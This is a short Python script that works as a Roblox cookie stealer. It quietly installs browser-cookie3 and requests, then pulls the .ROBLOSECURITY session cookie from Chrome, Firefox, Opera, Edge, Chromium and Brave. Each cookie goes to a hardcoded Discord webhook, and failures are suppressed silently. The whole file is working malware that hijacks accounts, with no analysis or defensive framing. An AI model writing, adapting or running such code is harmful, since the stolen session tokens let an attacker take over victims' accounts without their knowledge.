import subprocess
import sys

required_packages = ["browser-cookie3", "requests"]

for package in required_packages:
    try:
        __import__(package.replace("-", "_"))
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import browser_cookie3 as bc
from threading import Thread
import requests

class Cookies:
	def __init__(self, webhook):   # xxx
		self.webhook = webhook

	def get_chrome(self):
		try:
			cookie = str(bc.chrome(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def get_firefox(self):
		try:
			cookie = str(bc.firefox(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def get_opera(self):
		try:
			cookie = str(bc.opera(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def get_edge(self):
		try:
			cookie = str(bc.edge(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def get_chromium(self): 
		try:
			cookie = str(bc.chromium(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def get_brave(self):
		try:
			cookie = str(bc.brave(domain_name='roblox.com'))
			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
			requests.post(self.webhook, json={'username':'Roblox', 'content':"```_|" + cookie + "```"})
			return cookie
		except:
			pass

	def run_all(self):
		Thread(target=self.get_chrome).start()
		Thread(target=self.get_firefox).start()
		Thread(target=self.get_opera).start()
		Thread(target=self.get_edge).start()
		Thread(target=self.get_chromium).start()
		Thread(target=self.get_brave).start()

log = Cookies('https://discord.com/api/webhooks/1469708040902148257/cfxGtvnDzAUT_xjrB6lugWOvDaycNC127T9sh8oEBqX_g3TnE5W62ihNFtcf1xZWtBc9')

def main():
   log.run_all()

if __name__ == '__main__':
	main()
exit
